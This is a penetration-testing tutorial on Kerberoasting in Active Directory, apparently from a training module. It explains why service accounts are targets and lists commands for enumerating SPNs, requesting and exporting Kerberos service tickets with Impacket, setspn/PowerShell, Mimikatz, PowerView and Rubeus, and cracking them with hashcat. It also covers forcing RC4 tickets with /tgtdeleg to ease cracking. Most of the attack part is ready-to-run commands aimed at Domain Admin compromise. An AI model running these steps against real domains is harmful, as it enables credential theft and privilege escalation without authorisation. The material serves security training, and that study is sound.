# Kerberoasting 
Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

## Linux
### Kerberoasting - Performing the Attack
Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s GetUserSPNs.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py] from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1], Rubeus[https://github.com/GhostPack/Rubeus], and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

### Kerberoasting with GetUserSPNs.py
`A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.`

We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

**Listing SPN Accounts with GetUserSPNs.py**
```
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME>
```

We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
**Requesting all TGS Tickets**
```
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -request
```

We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
**Requesting a Single TGS ticket**
```
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -request-user <DC_USER>
```

**Saving the TGS Ticket to an Output File**
```
$ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -request-user <DC_USER> -outputfile <FILENAME>
```

## Windows
### Kerberoasting - Semi Manual method
#### Enumerating SPNs with setspn.exe
```
> setspn.exe -Q */*
``` 

**Targeting a Single User**
```
> Add-Type -AssemblyName System.IdentityModel
> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

**Retrieving All Tickets Using setspn.exe**
```
PS > setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

#### Extracting Tickets from Memory with Mimikatz**
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  

```

**Preparing the Base64 Blob for Cracking**
```
$ echo "<base64 blob>" |  tr -d \\n 
```

**Placing the Output into a File as .kirbi**
```
$ cat encoded_file | base64 -d > sqldev.kirbi
```

**Extracting the Kerberos Ticket using kirbi2john.py**
```
$ python2.7 kirbi2john.py sqldev.kirbi
```

**Modifiying crack_file for Hashcat**
```
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

### Automated / Tool Based Route
#### Using PowerView to Extract TGS Tickets [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1]
```
PS > Import-Module .\PowerView.ps1
PS > Get-DomainUser * -spn | select samaccountname
```

**Using PowerView to Target a Specific User**
```
PS > Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

**Exporting All Tickets to a CSV File**
```
PS > Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

**Viewing the Contents of the .CSV File**
```
PS > cat .\ilfreight_tgs.csv
```

We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
#### Using Rubeus [https://github.com/GhostPack/Rubeus]
```
PS > .\Rubeus.exe
```

**Using the /stats Flag**
```
PS > .\Rubeus.exe kerberoast /stats
```
If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.

**Using the /nowrap Flag**
```
PS > .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

**Exporting to file**
PS > .\Rubeus.exe kerberoast /outfile:out.txt

## Cracking the Ticket Offline with Hashcat**
```
$ hashcat -m 13100 <FILENAME> /usr/share/wordlists/rockyou.txt 
```


















##### A Note on Encryption Types
`The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.`

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.

```
PS > .\Rubeus.exe kerberoast /user:testspn /nowrap
```

```
PS > Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here[https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797] tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.

###### Cracking the Ticket with Hashcat & rockyou.txt
```
$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.


###### Running Hashcat
```
$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

###### Using the /tgtdeleg Flag
We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

`Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.`
